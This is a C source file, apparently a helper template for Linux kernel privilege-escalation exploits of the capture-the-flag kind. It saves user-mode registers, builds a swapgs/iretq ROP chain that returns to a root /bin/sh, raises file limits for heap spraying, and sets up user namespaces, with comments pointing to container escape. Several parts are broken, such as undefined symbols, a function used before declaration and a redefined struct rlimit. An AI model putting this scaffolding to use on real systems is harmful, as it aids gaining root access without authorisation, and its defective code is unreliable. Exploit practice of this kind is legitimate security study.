#define _GNU_SOURCE

// clang-format off
#include <asm/ldt.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdnoreturn.h>

#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>

#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/ptrace.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/keyctl.h>
#include <linux/userfaultfd.h>

// clang-format on

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_DEFAULT "\033[0m"

#define DMSG(fmt, ...) fprintf(stderr, "[*]\t" fmt "\n", ##__VA_ARGS__)

#define IMSG(fmt, ...) \
  fprintf(stderr, COLOR_GREEN "[+]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define EMSG(fmt, ...) \
  fprintf(stderr, COLOR_RED "[-]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define fatal(fmt, ...)         \
  do {                        \
    EMSG(fmt, ##__VA_ARGS__); \
    exit(EXIT_FAILURE);       \
  } while (0)

// mem:
// https://elixir.bootlin.com/linux/v6.4.16/source/Documentation/arch/x86/x86_64/mm.rst
uint64_t kernel_base = 0xffffffff81000000;
uint64_t kernel_offset = 0;
uint64_t vmemmap_base = 0xffffea0000000000;
uint64_t page_offset_base = 0xffff888000000000;
uint64_t cpu_entry_area_mapping = 0xfffffe0000000000;

void debug() {
  DMSG("\t=============\tDEBUG\t=========");
  getchar();
}

static noreturn void err(char *msg) {
  EMSG("Error %s", msg);
  sleep(2);
  exit(EXIT_FAILURE);
}

/*
 * 保存用户态数据
 */
uint64_t user_cs, user_ss, user_rflags, user_rsp;

void save_status_() {
  asm volatile(
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_rsp, rsp;"
      "pushf;"
      "pop user_rflags;");
  IMSG("status saved");
}

void save_status() {
  asm volatile(
      "movq %%cs, %0;"
      "movq %%ss, %1;"
      "movq %%rsp, %3;"
      "pushfq;"
      "pop %2;"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
      :
      : "memory");
}

static void restore_status() {
  asm volatile(
      "swapgs ;"
      "movq %0, 0x20(%%rsp)\t\n"
      "movq %1, 0x18(%%rsp)\t\n"
      "movq %2, 0x10(%%rsp)\t\n"
      "movq %3, 0x08(%%rsp)\t\n"
      "movq %4, 0x00(%%rsp)\t\n"
      "iretq"
      :
      : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
        "r"(get_shell));
}

/*
 * 绑定cpu core
 */
void bind_core(int core) {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
  IMSG("bind core to: %d", core);
}

/*
 * root 执行，从而获得权限
 */
void get_shell(void) {
  if (getuid()) {
    fatal("Failed to get the root!");
  }

  IMSG("Successful to get the root.");
  IMSG("execve root shell now...");

  system("/bin/sh");
  exit(0);
}

static void spawn_shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  if (!getuid()) {
    IMSG("get shell !");
    execve("/bin/sh", argv, envp);
  } else {
    fatal("fail get root");
  }
}

void rop() {
  uint64_t rop[0x10], i = 0;
  // swapgs --> iretq: rip, cs, rflags, rsp, ss. get_she;;
  rop[i++] = swapgs;  // 后面还存在指令，需要查看到ret前的内容
  rop[i++] = 0;
  rop[i++] = iretq;
  rop[i++] = (uint64_t)get_shell;  // rip
  rop[i++] = user_cs;
  rop[i++] = user_rflags;
  rop[i++] = user_rsp;
  rop[i++] = user_ss;
}

/*
 * pt_regs
 * CONFIG_RANDOMIZE_KSTACK_OFFSET=y  可以一定程度避免这种攻击
 */
// __asm__(
//     "mov r15, 0x55555555;"
//     "mov r14, 0x44444444;"
//     "mov r13, 0x33333333;"
//     "mov r12, 0x22222222;"
//     "mov rbp, 0xbbbb1111;"
//     "mov rbx, 0xbbbb2222;"
//     "mov r11, 0x11111111;"
//     "mov r10, 0x11110000;"
//     "mov r9,  0x99999999;"
//     "mov r8,  0x88888888;"
//     "xor rax, rax;"
//     "mov rcx, 0x666666;"
//     "mov rdx, 8;"
//     "mov rsi, rsp;"
//     "mov rdi, seq_fd;"
//     "syscall");

void hexdump(const void *data, uint64_t size) {
  char ascii[17];
  uint64_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

// file descriptors in a process are generally up to 1024
// we can use `ulimit -n` command to check
// but `setrlimit (set resource limit)` function can change the max value
// often used when heap-spraying
// more info :  `man setrlimit`

#include <sys/resource.h>
#include <sys/time.h>

struct rlimit {
  rlim_t rlim_cur; /* Soft limit */
  rlim_t rlim_max; /* Hard limit (ceiling for rlim_cur) */
};

#define MAX_FILE_NO 0x1000

void adjust_rlimit(void) {
  struct rlimit lim;

  lim.rlim_cur = MAX_FILE_NO;
  lim.rlim_max = MAX_FILE_NO;

  if (setrlimit(RLIMIT_NOFILE, &lim) != 0) {
    fatal("`setrlimit()` failed: %s", strerror(errno));
  }

  IMSG("Increased fd limit to %#x", lim.rlim_cur);
}

// man 2 unshare
// new namespace
// have CAP_SYS_ADMIN capability : is useful in Container Escape
void setup_sandbox(void) {
  if (unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0) {
    fatal("unshare(CLONE_NEWNS | CLONE_NEWUSER)");
  }

  IMSG("success setup sandbox");

  bind_core(0);
}